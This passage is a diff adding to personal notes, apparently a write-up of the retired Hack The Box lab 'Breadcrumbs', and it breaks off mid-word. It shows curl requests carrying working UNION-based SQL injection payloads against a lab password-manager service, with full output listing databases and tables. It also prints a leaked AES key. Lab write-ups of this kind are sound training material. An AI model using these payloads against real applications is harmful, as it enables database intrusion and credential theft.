@@ -86,5 +86,458 @@ This pogram needs two arguments one is file itself and other is key. The program
 ## Adding passmanager.htb to /etc/hosts file
 ![[Pasted image 20210730211834.png]]
 ## Making curl request to service on port 1234 gives AES key
+```bash
+~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/breadcrumbs_retired ❯ curl "http://passmanager.htb:1234/index.php" -d "method=select&username=administrator&table=passwords"
 
+selectarray(1) {
+  [0]=>
+  array(1) {
+    ["aes_key"]=>
+    string(16) "k19D193j.<19391("
+  }
+}
+```
+## Discovering SQL injection on service running on port 1234
+![[Pasted image 20210730212334.png]]
+## Exploiting SQL injection on service running on port 1234 to get creds of administrator 
+Knowing database name via command `curl "http://passmanager.htb:1234/index.php" -d "method=select&username=administrator' union select SCHEMA_NAME from INFORMATION_SCHEMA.schemata-- -&table=passwords"`
+```bash
+~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/breadcrumbs_retired ❯ curl "http://passmanager.htb:1234/index.php" -d "method=select&username=administrator' union select SCHEMA_NAME from INFORMATION_SCHEMA.schemata-- -&table=passwords"
 
+selectarray(3) {
+  [0]=>
+  array(1) {
+    ["aes_key"]=>
+    string(16) "k19D193j.<19391("
+  }
+  [1]=>
+  array(1) {
+    ["aes_key"]=>
+    string(18) "information_schema"
+  }
+  [2]=>
+  array(1) {
+    ["aes_key"]=>
+    string(5) "bread"
+  }
+}
+~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/breadcrumbs_retired ❯
+```
+Knowing table names in database `bread` via command `curl "http://passmanager.htb:1234/index.php" -d "method=select&username=administrator' union select TABLE_NAME from INFORMATION_SCHEMA.tables-- -&table=passwords"`
+```bash
+~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/breadcrumbs_retired ❯ curl "http://passmanager.htb:1234/index.php" -d "method=select&username=administrator' union select TABLE_NAME from INFORMATION_SCHEMA.tables-- -&table=passwords"
+
+selectarray(82) {
+  [0]=>
+  array(1) {
+    ["aes_key"]=>
+    string(16) "k19D193j.<19391("
+  }
+  [1]=>
+  array(1) {
+    ["aes_key"]=>
+    string(11) "ALL_PLUGINS"
+  }
+  [2]=>
+  array(1) {
+    ["aes_key"]=>
+    string(16) "APPLICABLE_ROLES"
+  }
+  [3]=>
+  array(1) {
+    ["aes_key"]=>
+    string(14) "CHARACTER_SETS"
+  }
+  [4]=>
+  array(1) {
+    ["aes_key"]=>
+    string(17) "CHECK_CONSTRAINTS"
+  }
+  [5]=>
+  array(1) {
+    ["aes_key"]=>
+    string(10) "COLLATIONS"
+  }
+  [6]=>
+  array(1) {
+    ["aes_key"]=>
+    string(37) "COLLATION_CHARACTER_SET_APPLICABILITY"
+  }
+  [7]=>
+  array(1) {
+    ["aes_key"]=>
+    string(7) "COLUMNS"
+  }
+  [8]=>
+  array(1) {
+    ["aes_key"]=>
+    string(17) "COLUMN_PRIVILEGES"
+  }
+  [9]=>
+  array(1) {
+    ["aes_key"]=>
+    string(13) "ENABLED_ROLES"
+  }
+  [10]=>
+  array(1) {
+    ["aes_key"]=>
+    string(7) "ENGINES"
+  }
+  [11]=>
+  array(1) {
+    ["aes_key"]=>
+    string(6) "EVENTS"
+  }
+  [12]=>
+  array(1) {
+    ["aes_key"]=>
+    string(5) "FILES"
+  }
+  [13]=>
+  array(1) {
+    ["aes_key"]=>
+    string(13) "GLOBAL_STATUS"
+  }
+  [14]=>
+  array(1) {
+    ["aes_key"]=>
+    string(16) "GLOBAL_VARIABLES"
+  }
+  [15]=>
+  array(1) {
+    ["aes_key"]=>
+    string(10) "KEY_CACHES"
+  }
+  [16]=>
+  array(1) {
+    ["aes_key"]=>
+    string(16) "KEY_COLUMN_USAGE"
+  }
+  [17]=>
+  array(1) {
+    ["aes_key"]=>
+    string(15) "OPTIMIZER_TRACE"
+  }
+  [18]=>
+  array(1) {
+    ["aes_key"]=>
+    string(10) "PARAMETERS"
+  }
+  [19]=>
+  array(1) {
+    ["aes_key"]=>
+    string(10) "PARTITIONS"
+  }
+  [20]=>
+  array(1) {
+    ["aes_key"]=>
+    string(7) "PLUGINS"
+  }
+  [21]=>
+  array(1) {
+    ["aes_key"]=>
+    string(11) "PROCESSLIST"
+  }
+  [22]=>
+  array(1) {
+    ["aes_key"]=>
+    string(9) "PROFILING"
+  }
+  [23]=>
+  array(1) {
+    ["aes_key"]=>
+    string(23) "REFERENTIAL_CONSTRAINTS"
+  }
+  [24]=>
+  array(1) {
+    ["aes_key"]=>
+    string(8) "ROUTINES"
+  }
+  [25]=>
+  array(1) {
+    ["aes_key"]=>
+    string(8) "SCHEMATA"
+  }
+  [26]=>
+  array(1) {
+    ["aes_key"]=>
+    string(17) "SCHEMA_PRIVILEGES"
+  }
+  [27]=>
+  array(1) {
+    ["aes_key"]=>
+    string(14) "SESSION_STATUS"
+  }
+  [28]=>
+  array(1) {
+    ["aes_key"]=>
+    string(17) "SESSION_VARIABLES"
+  }
+  [29]=>
+  array(1) {
+    ["aes_key"]=>
+    string(10) "STATISTICS"
+  }
+  [30]=>
+  array(1) {
+    ["aes_key"]=>
+    string(16) "SYSTEM_VARIABLES"
+  }
+  [31]=>
+  array(1) {
+    ["aes_key"]=>
+    string(6) "TABLES"
+  }
+  [32]=>
+  array(1) {
+    ["aes_key"]=>
+    string(11) "TABLESPACES"
+  }
+  [33]=>
+  array(1) {
+    ["aes_key"]=>
+    string(17) "TABLE_CONSTRAINTS"
+  }
+  [34]=>
+  array(1) {
+    ["aes_key"]=>
+    string(16) "TABLE_PRIVILEGES"
+  }
+  [35]=>
+  array(1) {
+    ["aes_key"]=>
+    string(8) "TRIGGERS"
+  }
+  [36]=>
+  array(1) {
+    ["aes_key"]=>
+    string(15) "USER_PRIVILEGES"
+  }
+  [37]=>
+  array(1) {
+    ["aes_key"]=>
+    string(5) "VIEWS"
+  }
+  [38]=>
+  array(1) {
+    ["aes_key"]=>
+    string(17) "CLIENT_STATISTICS"
+  }
+  [39]=>
+  array(1) {
+    ["aes_key"]=>
+    string(16) "INDEX_STATISTICS"
+  }
+  [40]=>
+  array(1) {
+    ["aes_key"]=>
+    string(20) "INNODB_SYS_DATAFILES"
+  }
+  [41]=>
+  array(1) {
+    ["aes_key"]=>
+    string(16) "GEOMETRY_COLUMNS"
+  }
+  [42]=>
+  array(1) {
+    ["aes_key"]=>
+    string(21) "INNODB_SYS_TABLESTATS"
+  }
+  [43]=>
+  array(1) {
+    ["aes_key"]=>
+    string(15) "SPATIAL_REF_SYS"
+  }
+  [44]=>
+  array(1) {
+    ["aes_key"]=>
+    string(18) "INNODB_BUFFER_PAGE"
+  }
+  [45]=>
+  array(1) {
+    ["aes_key"]=>
+    string(10) "INNODB_TRX"
+  }
+  [46]=>
+  array(1) {
+    ["aes_key"]=>
+    string(20) "INNODB_CMP_PER_INDEX"
+  }
+  [47]=>
+  array(1) {
+    ["aes_key"]=>
+    string(14) "INNODB_METRICS"
+  }
+  [48]=>
+  array(1) {
+    ["aes_key"]=>
+    string(17) "INNODB_LOCK_WAITS"
+  }
+  [49]=>
+  array(1) {
+    ["aes_key"]=>
+    string(10) "INNODB_CMP"
+  }
+  [50]=>
+  array(1) {
+    ["aes_key"]=>
+    string(17) "THREAD_POOL_WAITS"
+  }
+  [51]=>
+  array(1) {
+    ["aes_key"]=>
+    string(16) "INNODB_CMP_RESET"
+  }
+  [52]=>
+  array(1) {
+    ["aes_key"]=>
+    string(18) "THREAD_POOL_QUEUES"
+  }
+  [53]=>
+  array(1) {
+    ["aes_key"]=>
+    string(16) "TABLE_STATISTICS"
+  }
+  [54]=>
+  array(1) {
+    ["aes_key"]=>
+    string(17) "INNODB_SYS_FIELDS"
+  }
+  [55]=>
+  array(1) {
+    ["aes_key"]=>
+    string(22) "INNODB_BUFFER_PAGE_LRU"
+  }
+  [56]=>
+  array(1) {
+    ["aes_key"]=>
+    string(12) "INNODB_LOCKS"
+  }
+  [57]=>
+  array(1) {
+    ["aes_key"]=>
+    string(21) "INNODB_FT_INDEX_TABLE"
+  }
+  [58]=>
+  array(1) {
+    ["aes_key"]=>
+    string(13) "INNODB_CMPMEM"
+  }
+  [59]=>
+  array(1) {
+    ["aes_key"]=>
+    string(18) "THREAD_POOL_GROUPS"
+  }
+  [60]=>
+  array(1) {
+    ["aes_key"]=>
+    string(26) "INNODB_CMP_PER_INDEX_RESET"
+  }
+  [61]=>
+  array(1) {
+    ["aes_key"]=>
+    string(23) "INNODB_SYS_FOREIGN_COLS"
+  }
+  [62]=>
+  array(1) {
+    ["aes_key"]=>
+    string(21) "INNODB_FT_INDEX_CACHE"
+  }
+  [63]=>
+  array(1) {
+    ["aes_key"]=>
+    string(24) "INNODB_BUFFER_POOL_STATS"
+  }
+  [64]=>
+  array(1) {
+    ["aes_key"]=>
+    string(23) "INNODB_FT_BEING_DELETED"
+  }
+  [65]=>
+  array(1) {
+    ["aes_key"]=>
+    string(18) "INNODB_SYS_FOREIGN"
+  }
+  [66]=>
+  array(1) {
+    ["aes_key"]=>
+    string(19) "INNODB_CMPMEM_RESET"
+  }
+  [67]=>
+  array(1) {
+    ["aes_key"]=>
+    string(26) "INNODB_FT_DEFAULT_STOPWORD"
+  }
+  [68]=>
+  array(1) {
+    ["aes_key"]=>
+    string(17) "INNODB_SYS_TABLES"
+  }
+  [69]=>
+  array(1) {
+    ["aes_key"]=>
+    string(18) "INNODB_SYS_COLUMNS"
+  }
+  [70]=>
+  array(1) {
+    ["aes_key"]=>
+    string(16) "INNODB_FT_CONFIG"
+  }
+  [71]=>
+  array(1) {
+    ["aes_key"]=>
+    string(15) "USER_STATISTICS"
+  }
+  [72]=>
+  array(1) {
+    ["aes_key"]=>
+    string(22) "INNODB_SYS_TABLESPACES"
+  }
+  [73]=>
+  array(1) {
+    ["aes_key"]=>
+    string(18) "INNODB_SYS_VIRTUAL"
+  }
+  [74]=>
+  array(1) {
+    ["aes_key"]=>
+    string(18) "INNODB_SYS_INDEXES"
+  }
+  [75]=>
+  array(1) {
+    ["aes_key"]=>
+    string(26) "INNODB_SYS_SEMAPHORE_WAITS"
+  }
+  [76]=>
+  array(1) {
+    ["aes_key"]=>
+    string(14) "INNODB_MUTEXES"
+  }
+  [77]=>
+  array(1) {
+    ["aes_key"]=>
+    string(14) "user_variables"
+  }
+  [78]=>
+  array(1) {
+    ["aes_key"]=>
+    string(29) "INNODB_TABLESPACES_ENCRYPTION"
+  }
+  [79]=>
+  array(1) {
+    ["aes_key"]=>
+    string(17) "INNODB_FT_DELETED"
+  }
+  [80]=>
+  array(1) {
+    ["aes_key"]=>
+    string(17) "THREAD_POOL_STATS"
+  }
+  [81]=>
+  array(1) {
+    ["aes_key"]=>
+    string(9) "passwords"
+  }
+}
+```
+Determining colu
